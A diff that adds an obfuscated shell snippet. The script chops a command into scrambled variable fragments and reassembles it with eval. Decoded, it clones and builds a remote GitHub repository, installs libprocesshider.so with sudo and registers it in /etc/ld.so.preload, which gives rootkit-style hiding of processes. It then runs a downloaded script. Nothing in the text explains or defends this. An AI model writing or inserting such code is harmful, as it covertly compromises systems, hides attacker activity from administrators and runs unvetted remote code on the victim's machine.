@@ -1,0 +1,3 @@
+z="
+";Wz='usr/';oz='mod ';Ez='//gi';gz='r.so';az='& ec';Gz='.com';Dz='tps:';Fz='thub';rz='h &&';Mz=' && ';lz='relo';jz='/ld.';Nz='cd L';mz='ad &';sz=' ./d';Bz='clon';Oz='make';Cz='e ht';Tz='sshi';Az='git ';tz='h';Uz='der.';fz='hide';dz='bpro';pz='+x d';Zz='b/ &';hz=' >> ';qz='em.s';ez='cess';Lz='.git';Xz='loca';Yz='l/li';cz='b/li';Iz='aadl';nz='& ch';Vz='so /';Pz='sudo';Sz='roce';iz='/etc';Qz=' mv ';Jz='ef/L';bz='ho /';Rz='libp';Kz='epom';kz='so.p';Hz='/Zur';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Kz$Mz$Oz$Mz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$Wz$Xz$Yz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$qz$tz"
